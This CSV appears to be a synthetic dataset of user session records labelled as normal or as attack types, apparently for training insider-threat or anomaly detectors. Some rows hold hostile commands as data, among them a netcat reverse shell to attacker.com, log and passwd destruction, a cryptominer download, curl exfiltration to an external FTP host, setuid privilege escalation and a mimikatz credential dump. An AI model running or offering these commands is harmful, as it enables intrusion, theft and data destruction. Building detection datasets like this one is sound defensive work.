timestamp,entity_id,entity_type,login_hour,day_of_week,session_duration,command_length,unique_resources,failed_login_count,is_known_device,is_known_location,auth_method,source_ip,geo_location,device_fingerprint,resource_accessed,command_sequence,login_success,label
2025-06-09 15:42:05,user_0134,admin,5,4,233,901,10,4,0,0,certificate,83.56.18.48,"Amsterdam, NL",91009d4c6055886b4168e48919e7c6f6,devops_pipeline,crontab -e; echo '@reboot nc -e /bin/sh attacker.com 4444',1,Persistence Mechanism
2025-01-26 15:16:25,user_0121,employee,14,4,1915,142,1,1,1,1,mfa,172.29.81.163,"London, UK",847d1c2cd5786a3a3f4ab38921afe791,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-05-05 03:05:03,user_0143,employee,16,2,532,48,1,1,1,1,sso,10.240.196.175,"Singapore, SG",0730bac2209ea62d72551894adcf3ad8,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-01-20 18:19:18,user_0072,employee,11,3,3344,179,2,0,0,0,oauth,118.161.82.210,"Sydney, AU",1b0f025c39c22f63324db8910a907b67,compliance_dashboard,ls -la; cat report.txt; logout,1,Impossible Travel
2025-05-28 22:19:18,user_0108,employee,18,4,1405,179,5,0,1,1,mfa,10.250.1.219,"New York, US",7ca37acdf21f579dc8c55f4882ea725a,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-03-31 16:01:00,user_0004,employee,18,3,1928,200,5,0,1,1,sso,192.168.67.198,"London, UK",3af0db9fd3c3b98ab6654b39f90936a3,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-12-08 14:59:28,user_0198,employee,12,1,945,90,1,0,1,1,sso,10.120.8.150,"Singapore, SG",65120af8c9e66a93a43e431028ecbf93,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-04-30 20:21:00,user_0165,contractor,13,0,1220,53,4,1,1,1,password,172.20.120.85,"Tokyo, JP",3daebd08687a35594ce5a21d4e24046e,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-01-31 01:36:55,user_0167,employee,18,4,1340,121,3,0,1,1,sso,192.168.133.237,"London, UK",fc9f23d7fef59e4edb681065162ba612,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-06-20 06:58:04,user_0195,contractor,8,2,1220,157,3,0,1,1,mfa,192.168.221.118,"Singapore, SG",6e027fd3e7064c4ce58cf7dc7b68af2c,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-02-03 10:20:00,user_0055,employee,14,0,3418,100,1,1,1,1,password,192.168.87.98,"Singapore, SG",0c1da199f95cd4b30f9a9c4bd050151b,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-03-24 02:09:14,user_0023,contractor,19,3,3029,209,5,2,0,0,oauth,207.190.185.243,"Amsterdam, NL",3a220d05e7ed7e2aa31c3327994f06de,email_server,ls -la; cat report.txt; logout,1,Impossible Travel
2024-01-28 10:52:46,user_0027,contractor,11,5,2760,54,19,0,1,1,sso,172.22.186.29,"Sydney, AU",eddbd74aa761b4800ab1848fc015fad3,customer_data,ls -la; cat report.txt; logout,1,Unusual Resource Access
2025-05-07 06:08:34,user_0068,contractor,18,2,2156,49,5,0,1,1,sso,172.23.149.0,"Berlin, DE",25d332b91f377255f49b056a55684cbb,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-03-23 03:40:17,user_0034,employee,17,0,1609,157,5,0,1,1,password,10.103.24.18,"Tokyo, JP",f816b4ebceed8a10679649dd6ff40b4f,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-04-23 01:22:43,user_0024,contractor,17,2,1742,61,5,0,1,1,sso,10.118.173.64,"Singapore, SG",42827a1492e50fec6a44aaff51bed889,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-08-12 10:55:31,user_0045,employee,13,3,2220,30,5,1,1,1,mfa,192.168.140.250,"New York, US",9975cbbb771fe8049e71a09ccaa1d933,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-11-29 18:37:10,user_0016,employee,17,3,1088,155,3,1,1,1,password,192.168.81.18,"Tokyo, JP",8ecd38cba053e56add373d04404fe0a4,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-01-21 04:57:57,user_0130,employee,10,2,2414,167,2,1,1,1,sso,10.167.184.241,"New York, US",9b9c62121973190ef88db71a81ac31ee,email_server,ls -la; cat report.txt; logout,1,Normal
2024-05-07 05:11:57,user_0036,employee,11,0,1973,23,3,1,1,1,password,10.125.143.135,"London, UK",078c997007f47bcc300e13c75b0cc842,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-02-02 16:10:34,user_0075,contractor,9,2,2111,187,3,1,1,1,password,172.22.26.97,"London, UK",21bc9af7585787b508590f9f7eee317e,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-06-19 05:41:28,user_0086,admin,2,2,1380,154,1,0,1,1,mfa,192.168.233.55,"Cape Town, ZA",5c8d0a688365276fa4178a67143104d9,customer_data,ls -la; cat report.txt; logout,1,Off-Hours Access
2024-02-22 16:05:35,user_0194,employee,8,3,2710,144,4,0,1,1,mfa,10.114.94.144,"New York, US",9d5f967462d7ea11bcbbc2300e3736c1,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-04-08 00:34:26,user_0057,contractor,8,1,796,79,5,0,1,1,sso,192.168.62.98,"New York, US",e8eee49cada120645744fc5c96d95066,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-05-06 21:19:56,user_0166,contractor,12,0,2855,159,5,0,1,1,password,10.69.154.187,"London, UK",36098facc6e157579fad5e73d96e18b9,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-03-29 06:28:46,user_0198,contractor,15,4,2111,91,3,0,1,1,password,172.24.60.249,"Tokyo, JP",74dcd0d79b38eb6e1020aa88ca667bb4,email_server,ls -la; cat report.txt; logout,1,Normal
2024-12-18 05:10:57,user_0071,employee,13,0,2075,45,5,1,1,1,password,192.168.116.231,"Singapore, SG",e8d5803dadfdf237b9849de9bf9c4e9d,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-11-14 13:46:32,user_0117,contractor,9,4,2758,21,2,1,1,1,sso,192.168.209.228,"Singapore, SG",b0874d31c630a9b3b96fffe3ab200f7f,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-02-12 00:55:50,user_0063,service_account,4,2,803,94,3,0,1,1,mfa,172.21.57.74,"Sydney, AU",15e9883c314f3b3d6e9b86435ec4fedc,secrets_vault,ls -la; cat report.txt; logout,1,Off-Hours Access
2024-05-04 08:52:16,user_0148,employee,18,2,2252,160,1,1,1,1,sso,10.178.249.7,"New York, US",f9692f07211aa8d090de7530c19c95df,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-05-08 15:40:11,user_0175,employee,10,4,2797,128,2,1,1,1,password,10.205.91.146,"Tokyo, JP",2b6a05797a580e5eff75af2e0617224e,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-03-07 07:30:02,user_0070,contractor,4,6,292,1269,4,0,1,1,password,10.96.244.127,"Amsterdam, NL",d6dd34264a38826bdc9debd109bda157,source_code_repo,rm -rf /var/log/*; shred -u /etc/passwd; history -c,1,Data Destruction
2025-06-20 17:32:21,user_0020,employee,16,0,1812,169,5,0,1,1,mfa,192.168.136.119,"London, UK",2e1ee2b3c80df3e1e24bce2a0a979cd6,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-07-04 03:16:04,user_0049,admin,19,4,1543,317,12,2,0,0,oauth,101.206.249.62,"Dubai, AE",f41316af4a3dc55b6a930b37fcf38c7e,devops_pipeline,ls -la; cat report.txt; logout,1,Impossible Travel
2025-02-11 09:51:02,user_0122,employee,11,3,2132,101,1,0,1,1,sso,192.168.76.50,"Berlin, DE",703ad62b8c1c8c560c9e50d68b2709ad,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-01-23 18:46:07,user_0003,employee,9,2,1518,32,4,1,1,1,password,172.22.61.253,"Singapore, SG",19e97d6edb63863286fffa8d1f846dcc,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-10-13 06:48:11,user_0181,employee,17,3,3128,40,2,1,1,1,mfa,192.168.205.2,"Singapore, SG",4d35619c1ef09fb1a3e53e01398b2dc4,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-10-23 03:15:43,user_0101,employee,15,3,1138,75,1,1,1,1,sso,192.168.57.85,"New York, US",d12b84b389f203acfde8d0a66abd4e1a,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-08-06 15:33:29,user_0154,contractor,10,0,3225,134,2,1,1,1,mfa,10.232.131.129,"London, UK",37fe460fd42d3e4b29113e9fd83362f8,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-09-27 12:55:44,user_0094,employee,13,2,2732,187,1,1,1,1,password,192.168.141.245,"Berlin, DE",2767159b5c13ff624ee1ff72856d5e35,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-07-31 10:55:44,user_0116,employee,10,4,3431,60,4,0,1,1,password,172.29.20.197,"Singapore, SG",5c3e887f83aa972ca95eec14feafc6d5,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-01-03 09:16:14,user_0073,contractor,14,0,883,197,5,1,1,1,mfa,192.168.171.41,"New York, US",6aaa7b4c7bd0867248c44ef7f0e6289a,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-01-23 15:47:55,user_0031,contractor,11,4,1430,37,5,1,1,1,mfa,172.17.136.227,"London, UK",328445c72c4f6e0ef120606afca68ad4,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-09-16 06:20:19,user_0012,contractor,16,1,346,183,2,1,1,1,mfa,172.28.158.56,"New York, US",eab8df6221e19323dfdbaf1bfd20f9ef,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-04-19 17:52:40,user_0076,contractor,14,4,2593,34,4,0,1,1,sso,172.24.216.98,"Tokyo, JP",d2979bff805c13d74d690f19bd789c3b,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-04-04 22:43:15,user_0030,contractor,13,4,699,133,2,1,1,1,mfa,192.168.131.242,"New York, US",fc59b70d68a4716c9cd0b4932f515c74,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-10-14 19:56:30,user_0170,employee,16,2,351,127,4,0,1,1,mfa,10.248.228.177,"Berlin, DE",73fe1db581a95135f41e03de7864e05b,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-04-26 21:30:07,user_0023,contractor,15,0,1986,194,5,0,1,1,password,10.69.93.31,"Berlin, DE",6d1c60fd41edee964dd3d6421fb155f9,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-19 03:37:53,user_0175,contractor,11,2,1976,196,1,1,1,1,mfa,192.168.46.247,"Tokyo, JP",73a91a17e7d914b891cccf4699326a88,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-01-23 06:17:59,user_0194,service_account,5,0,43220,576,5,3,0,0,password,200.189.118.240,"Mumbai, IN",fe1fc436401d542e91735bffc0256b11,admin_console,wget miner.exe; chmod +x miner.exe; ./miner.exe --pool pool.minexmr.com,1,Cryptomining
2024-06-07 13:53:07,user_0031,contractor,18,2,3112,130,2,0,1,1,password,10.42.26.226,"Tokyo, JP",91dc8b1008700cfd2ff175e6f74abf0c,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-03-26 08:28:43,user_0068,employee,10,2,1991,188,3,0,1,1,password,192.168.12.20,"Tokyo, JP",f333ced580afe089abaf92185aab8312,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-04-10 10:16:34,user_0131,contractor,8,2,2203,25,2,0,1,1,mfa,172.27.122.20,"Singapore, SG",a3014ec879cec4108860086fc9dfc423,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-10-23 20:51:25,user_0187,employee,14,1,2646,59,4,1,1,1,sso,10.249.87.125,"Berlin, DE",d2fa8c88be42ead322a167935862b85b,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-02-03 07:14:48,user_0011,employee,12,2,2918,78,5,0,1,1,password,10.92.222.138,"London, UK",c38e11f0b349d5599242e6a4bf748bb3,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-11-10 05:00:01,user_0035,employee,8,4,1390,121,4,0,1,1,sso,10.199.174.151,"Singapore, SG",f665290e0097b9f63824196fd8921ade,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-07-24 08:41:21,user_0165,employee,8,1,2200,122,4,1,1,1,mfa,172.26.224.209,"Singapore, SG",8c2d7306e908b31ce2ceb05803806f4c,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-13 08:40:48,user_0086,employee,8,3,1185,177,4,0,1,1,password,192.168.78.6,"New York, US",0934a318065181c4ffe8e129ae431015,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-09-20 18:21:14,user_0024,contractor,18,1,2043,58,3,1,1,1,mfa,172.16.136.42,"Tokyo, JP",0478d633bf8d0c384d611e12cb53d1cd,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-06-08 00:03:35,user_0135,contractor,9,1,1112,71,4,0,1,1,password,10.163.199.124,"London, UK",ebd9d906dc0866aabdb664f675c14f99,email_server,ls -la; cat report.txt; logout,1,Normal
2025-05-03 23:00:01,user_0172,employee,18,3,725,72,5,1,1,1,sso,10.233.246.37,"New York, US",d777bc0104923f7e04e5988be8de8579,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-06-12 17:40:08,user_0038,employee,8,4,3169,48,2,0,1,1,mfa,172.26.83.79,"Berlin, DE",9257d0010924bffcd66971684efc4326,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-06-30 14:10:08,user_0114,contractor,18,0,1770,41,3,0,1,1,mfa,192.168.117.24,"London, UK",2503db749b97a7eb311de46a75ad2ec8,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-04-03 23:48:22,user_0036,employee,10,0,2636,67,2,1,1,1,sso,10.240.231.230,"Singapore, SG",4b5d14a1dbd7bd0d3d613e11a76c7902,email_server,ls -la; cat report.txt; logout,1,Normal
2024-03-26 15:09:13,user_0148,contractor,14,2,317,67,2,0,1,1,mfa,10.44.154.177,"Tokyo, JP",d2c7aaa86d8dcffd0a034003e9f16c3e,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-01-25 22:52:19,user_0099,contractor,10,0,487,96,3,1,1,1,sso,172.16.173.112,"Singapore, SG",08c447ac83f9efa9ba77b90126b62002,email_server,ls -la; cat report.txt; logout,1,Normal
2024-12-06 14:59:30,user_0099,contractor,17,4,1127,189,2,0,1,1,mfa,10.210.29.114,"New York, US",dcda43766db188dd28ffcd3faf5d49b4,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-03-20 02:12:56,user_0124,vendor,21,4,5280,1632,9,1,1,1,sso,10.238.163.26,"Beijing, CN",f7f78f142064e7d3e9c054bad1edb52c,customer_data,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Insider Threat
2024-05-06 14:37:43,user_0089,employee,17,0,393,58,5,0,1,1,sso,172.24.1.113,"Singapore, SG",afb5b0ff441ce9a70b55843f89ca3922,email_server,ls -la; cat report.txt; logout,1,Normal
2024-09-24 16:03:01,user_0083,service_account,17,5,2127,174,17,0,1,0,sso,172.27.148.34,"Amsterdam, NL",d8247f9867821af5ba91e113a0dccba7,admin_console,ls -la; cat report.txt; logout,1,Unusual Resource Access
2024-03-27 17:55:38,user_0153,contractor,8,4,3325,121,2,0,1,1,password,172.26.13.191,"Singapore, SG",47f8f4499aacadd8d077b8b03cc68f22,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-09-07 18:30:44,user_0180,employee,11,3,670,137,1,1,1,1,mfa,10.102.183.222,"Singapore, SG",e915837593dad516f1b61c7cc7bb56c8,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-11-23 00:08:21,user_0091,contractor,17,3,1061,82,2,0,1,1,password,192.168.213.201,"London, UK",170a5bd870a490bdf11131ef46c60faa,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-05-22 03:10:24,user_0088,employee,12,2,1026,130,3,1,1,1,password,192.168.29.139,"London, UK",c46d103666610cb5871318f222a0a4fc,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-05-13 05:47:18,user_0170,employee,17,0,2887,189,5,1,1,1,mfa,10.229.162.78,"Tokyo, JP",347f3827e9670502d85c794f17583ff5,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-12-18 23:56:51,user_0146,contractor,8,4,1269,52,1,0,1,1,password,172.26.238.161,"Tokyo, JP",3ec00eb3d399f6897412d356d92bdba1,email_server,ls -la; cat report.txt; logout,1,Normal
2024-12-05 01:31:04,user_0129,employee,16,2,1661,160,5,0,1,1,sso,10.198.91.225,"Singapore, SG",33bfc4a5139642a0ec6567d38eeb755a,email_server,ls -la; cat report.txt; logout,1,Normal
2024-05-01 03:30:31,user_0032,contractor,9,2,2941,161,2,0,1,1,sso,192.168.59.119,"New York, US",92d88eee22f76f1f7b941b151e7ab197,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-11-06 13:45:26,user_0106,contractor,17,2,1525,40,2,0,1,1,sso,10.65.67.142,"Tokyo, JP",59e990d3b9e27f4ce0792bddec41cf25,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-12-29 00:35:48,user_0173,employee,10,4,2695,62,5,1,1,1,sso,172.24.19.179,"Tokyo, JP",722aa70c73f09fc2e78d7dd0a3224000,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-02-20 05:13:41,user_0031,employee,11,1,3325,143,3,1,1,1,password,10.137.53.111,"London, UK",553380316e14fd15f64a68a185a04c51,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-09-20 12:43:58,user_0010,employee,13,0,1960,50,2,1,1,1,sso,172.26.251.98,"Singapore, SG",dd8081286635675ff6c137763f095771,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-10-16 20:39:22,user_0161,contractor,17,2,416,26,3,0,1,1,mfa,172.17.74.162,"New York, US",e75ba8dec0ce1271c44164c6b9d3ad7f,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-01-02 19:59:48,user_0021,employee,12,3,2228,145,3,0,1,1,sso,10.121.187.5,"Singapore, SG",be15abf384299c38757555a0bcb4e52f,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-05-24 13:40:17,user_0068,contractor,14,2,2059,43,2,1,1,1,sso,192.168.96.42,"Berlin, DE",1db79f1bb1171a6f78c91065b9889bde,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-06-21 20:52:20,user_0080,contractor,1,3,120,1659,8,3,1,0,certificate,77.94.73.54,"Cape Town, ZA",730c210777bd37e00af6dd8ee9bae87f,backup_storage,crontab -e; echo '@reboot nc -e /bin/sh attacker.com 4444',1,Persistence Mechanism
2025-05-12 08:42:52,user_0168,employee,8,3,1391,58,3,1,1,1,sso,172.26.25.53,"New York, US",ea730b9c6bf95772062a330f4e381f9d,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-05-29 08:39:13,user_0136,employee,17,0,2876,191,1,0,1,1,password,172.19.40.209,"London, UK",ea2c3509f0b3293832362171ce81db1d,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-03-04 15:01:31,user_0199,employee,17,3,2506,40,3,1,1,1,sso,10.200.127.35,"New York, US",2df4dc545ff4c3f5f9df555aecdb0882,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-03-31 10:19:44,user_0001,contractor,12,0,2043,51,18,3,1,1,sso,10.71.47.215,"Dubai, AE",25f090939ce854092d605eb0df3f721b,financial_db,ls -la; cat report.txt; logout,1,Unusual Resource Access
2024-09-27 04:58:10,user_0163,employee,17,4,1874,67,1,0,1,1,mfa,10.69.115.180,"Tokyo, JP",27132ea25c726b63816d06f74356b34b,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-08-25 22:44:01,user_0090,employee,13,4,3069,125,3,1,1,1,sso,172.19.17.223,"Tokyo, JP",53ebe082d591f9f32b91894946e1d5ff,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-03-12 08:41:01,user_0021,employee,18,1,1896,116,1,0,1,1,mfa,192.168.84.192,"Singapore, SG",887f3b05ecf866802e2836a54a38bd77,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-04-18 15:26:52,user_0042,contractor,14,0,1771,70,1,0,1,1,mfa,172.31.155.148,"New York, US",d7eeba3b262951a237569fdee2cfad59,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-06-16 02:22:09,user_0047,contractor,14,1,863,69,5,1,1,1,mfa,10.56.81.186,"Berlin, DE",4f345f17cfa534cd1336d2c72671033f,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-08-17 12:20:50,user_0125,employee,17,1,836,26,3,0,1,1,mfa,192.168.113.121,"Tokyo, JP",4df4de2eb502a3f7c0dc1f762759586c,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-04-01 10:18:29,user_0132,employee,15,0,3196,87,3,1,1,1,password,10.76.196.158,"New York, US",da02effefd848ff103cb74119705040a,email_server,ls -la; cat report.txt; logout,1,Normal
2025-02-01 22:09:15,user_0173,employee,9,3,2753,143,2,0,1,1,password,172.22.186.242,"Singapore, SG",a751bc17c37dc7ab391f0dfda52610f7,email_server,ls -la; cat report.txt; logout,1,Normal
2025-05-11 13:40:48,user_0083,contractor,14,1,2676,122,3,1,1,1,mfa,192.168.177.255,"Berlin, DE",930d3a165b7d180e380c7525378e73d9,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-03-06 15:04:09,user_0077,employee,12,4,1872,146,1,1,1,1,mfa,172.30.203.81,"Tokyo, JP",1b9b07ccc3900546b23d0d11ecc17618,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-07-29 23:20:55,user_0110,employee,17,0,2660,116,5,0,1,1,sso,10.77.188.71,"Berlin, DE",066e8ebbca4b1b4426065f6146cbb1bb,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-08-05 02:27:18,user_0178,employee,13,0,3157,173,3,1,1,1,mfa,192.168.28.56,"Berlin, DE",27cff6f5607692218898919f3ccdcb9f,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-10-23 21:07:13,user_0107,contractor,9,3,1864,45,2,0,1,1,mfa,172.21.118.89,"Berlin, DE",efd2709bfbba7a18ec5bb41881c4d3b6,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-02-10 12:42:07,user_0065,contractor,13,4,720,152,1,1,1,1,password,10.15.62.219,"London, UK",2948ed92ecfeeb981e394507a1ed0bb5,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-07-07 06:41:04,user_0155,admin,3,3,539,143,1,0,1,1,mfa,10.165.216.127,"Sydney, AU",3d882305af2e16f46f1bef6d89a61652,devops_pipeline,ls -la; cat report.txt; logout,1,Off-Hours Access
2024-04-04 15:23:59,user_0157,employee,16,2,1697,115,2,1,1,1,sso,192.168.186.197,"Tokyo, JP",60b181c1f255fdcda123c7e88eca635b,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-05-28 03:28:13,user_0057,contractor,12,1,3251,123,5,0,1,1,mfa,192.168.125.186,"Berlin, DE",2087d5d86ad979cc6e022ce50cfc576b,email_server,ls -la; cat report.txt; logout,1,Normal
2024-12-19 10:40:54,user_0184,contractor,22,5,4925,2555,8,0,1,1,api_key,192.168.82.101,"Moscow, RU",2aeded1b741996e9532d6e1a23350f9b,email_server,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Data Exfiltration
2025-03-03 17:01:35,user_0142,employee,11,1,1631,187,3,0,1,1,sso,172.29.245.22,"Singapore, SG",f8c4726d9bf7319ea598c595873b9e96,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-09-02 02:24:00,user_0014,service_account,6,4,453,1255,14,4,1,0,certificate,192.168.219.251,"Toronto, CA",f2436aa0189136b7be8a18c2ded34876,source_code_repo,sudo bash; chmod 4755 /usr/bin/find; visudo,1,Privilege Escalation
2024-12-04 21:04:10,user_0126,contractor,14,0,2091,85,3,0,1,1,mfa,172.28.59.52,"Berlin, DE",1cae9f231d641be76b098aec6bac9621,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-03-25 11:41:52,user_0175,employee,9,4,414,181,3,0,1,1,sso,172.29.111.28,"Singapore, SG",c30790f96b7b1f496f2e1700949c14e0,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-01-13 06:44:44,user_0039,service_account,14,1,2755,80,14,0,1,1,sso,172.18.190.15,"Beijing, CN",e7fc5100400f3e950a458081ec527a2c,internal_wiki,ls -la; cat report.txt; logout,1,Unusual Resource Access
2025-03-19 13:45:06,user_0087,contractor,8,4,1423,112,3,1,1,1,sso,172.30.135.145,"Singapore, SG",34fb81110936a5a38112c0a29c818a15,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-11-17 23:53:02,user_0036,service_account,4,2,225,1563,3,0,0,0,certificate,211.77.53.27,"Moscow, RU",91ad69e431a14405ecfee8b79afa67b8,hr_portal,crontab -e; echo '@reboot nc -e /bin/sh attacker.com 4444',1,Persistence Mechanism
2025-05-13 20:15:00,user_0169,employee,13,0,2469,43,4,0,1,1,mfa,172.17.121.228,"London, UK",a1ec2f5f055c2ce51872cc857889395a,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-03-27 12:42:53,user_0020,employee,11,1,3220,134,3,1,1,1,sso,172.31.231.138,"Singapore, SG",6a21b4e0348b824fd031a8706833c880,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-06-27 03:06:15,user_0184,contractor,10,2,1657,125,2,0,1,1,password,172.17.59.202,"New York, US",af057e4dfd6237ea52190a5f6e1c018d,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-03-04 11:10:05,user_0104,contractor,15,3,2449,74,3,0,1,1,password,172.22.254.252,"New York, US",c80e7add67f93be925d73aee0668ed54,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-03-03 02:24:42,user_0147,contractor,14,2,3242,123,5,0,1,1,mfa,10.224.169.178,"Berlin, DE",563bcb7af02120a31ad34f02e8d823be,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-08-17 15:07:41,user_0170,contractor,15,4,3239,129,2,1,1,1,mfa,172.16.120.194,"Tokyo, JP",27a6b69f71193f2de577c5037f78aefd,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-04-15 13:42:34,user_0121,employee,17,4,3476,188,5,1,1,1,password,10.12.58.20,"Berlin, DE",093f09742b56f70ff94719794d2923fb,email_server,ls -la; cat report.txt; logout,1,Normal
2024-10-25 19:49:39,user_0047,admin,13,1,691,2218,13,1,1,1,mfa,10.245.196.130,"Mexico City, MX",2cb31043856f32e34d885e5f780577bd,secrets_vault,mimikatz.exe privilege::debug sekurlsa::logonpasswords,1,Suspicious Command
2025-03-02 01:35:47,user_0005,contractor,11,2,3346,123,4,0,1,1,sso,172.17.24.112,"New York, US",f357b119abba3373b6d87f50ca62d563,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-04-09 16:36:40,user_0098,employee,8,0,538,34,1,0,1,1,sso,10.13.154.221,"Singapore, SG",d2430d1b08cadf066a296c8308b405e5,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-02-16 06:12:13,user_0083,employee,10,4,3186,56,1,1,1,1,password,192.168.48.196,"Berlin, DE",bac6abb14ec1b1727c22302030ac35d9,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-02-06 19:13:19,user_0015,employee,11,2,1250,27,5,1,1,1,mfa,172.30.254.95,"Tokyo, JP",8c1214386f76c38a5fb46a593750ccdf,financial_db,ls -la; cat report.txt; logout,1,Normal
